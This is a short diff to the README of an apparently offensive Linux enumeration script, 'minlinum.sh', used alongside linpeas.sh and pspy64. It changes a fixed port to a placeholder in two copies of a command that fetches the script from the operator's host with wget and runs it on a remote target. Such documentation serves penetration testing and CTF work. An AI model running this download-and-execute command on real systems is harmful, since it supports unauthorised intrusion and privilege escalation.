@@ -27,10 +27,10 @@ Pay attention to play `linpeas.sh` and `pspy64` in that folder so we will be abl
 
 On the remote machine:
 ```
-wget <my_ip>:8000/minlinum.sh; chmod +x minlinum.sh; ./minlinum.sh
+wget <my_ip>:<my_port>/minlinum.sh; chmod +x minlinum.sh; ./minlinum.sh
 ```
 
 ## Usage
 
 You can download the script to the remote machine and run it for you automatically by using:  
-`wget <my_ip>:8000/minlinum.sh; chmod +x minlinum.sh; ./minlinum.sh`
+`wget <my_ip>:<my_port>/minlinum.sh; chmod +x minlinum.sh; ./minlinum.sh`
